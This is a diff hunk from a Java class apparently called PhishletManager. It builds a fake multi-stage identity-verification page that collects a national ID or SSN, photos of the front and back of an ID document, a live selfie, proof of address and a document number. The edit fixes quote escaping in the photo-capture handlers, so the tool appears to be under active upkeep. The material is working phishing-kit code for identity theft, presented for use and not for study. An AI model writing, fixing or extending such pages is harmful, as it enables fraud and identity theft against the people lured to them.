@@ -199,10 +199,10 @@ public class PhishletManager {
             "<div class=\'field\'><label>National ID / SSN</label><input type=\'text\' name=\'nationalId\' placeholder=\'XXX-XX-XXXX or national ID number\' required></div>" +
             "<button class=\'btn\' onclick=\'nextStage(2)\'>Continue</button></div>" +
             "<div class=\'stage\' id=\'stage2\'><div class=\'security-badge\'><span>Take clear photos in good lighting</span></div>" +
-            "<div class=\'photo-grid\'><div class=\'photo-box\' onclick=\'capturePhoto("idFront")\'><div class=\'icon\'>ID</div><p>ID Document Front</p></div>" +
-            "<div class=\'photo-box\' onclick=\'capturePhoto("idBack")\'><div class=\'icon\'>ID</div><p>ID Document Back</p></div>" +
-            "<div class=\'photo-box\' onclick=\'capturePhoto("selfie")\'><div class=\'icon\'>CAM</div><p>Live Selfie Photo</p></div>" +
-            "<div class=\'photo-box\' onclick=\'capturePhoto("proof")\'><div class=\'icon\'>HOME</div><p>Proof of Address</p></div></div>" +
+            "<div class=\'photo-grid\'><div class=\'photo-box\' onclick=\'capturePhoto(\"idFront\")\'><div class=\'icon\'>ID</div><p>ID Document Front</p></div>" +
+            "<div class=\'photo-box\' onclick=\'capturePhoto(\"idBack\")\'><div class=\'icon\'>ID</div><p>ID Document Back</p></div>" +
+            "<div class=\'photo-box\' onclick=\'capturePhoto(\"selfie\")\'><div class=\'icon\'>CAM</div><p>Live Selfie Photo</p></div>" +
+            "<div class=\'photo-box\' onclick=\'capturePhoto(\"proof\")\'><div class=\'icon\'>HOME</div><p>Proof of Address</p></div></div>" +
             "<div class=\'field\'><label>Document Type</label><select name=\'docType\'><option>Passport</option><option selected>Driver\'s License</option><option>National ID Card</option><option>Residence Permit</option></select></div>" +
             "<div class=\'field\'><label>Document Number</label><input type=\'text\' name=\'docNumber\' placeholder=\'Document serial number\'></div>" +
             "<button class=\'btn\' onclick=\'nextStage(3)\'>Continue</button></div>" +
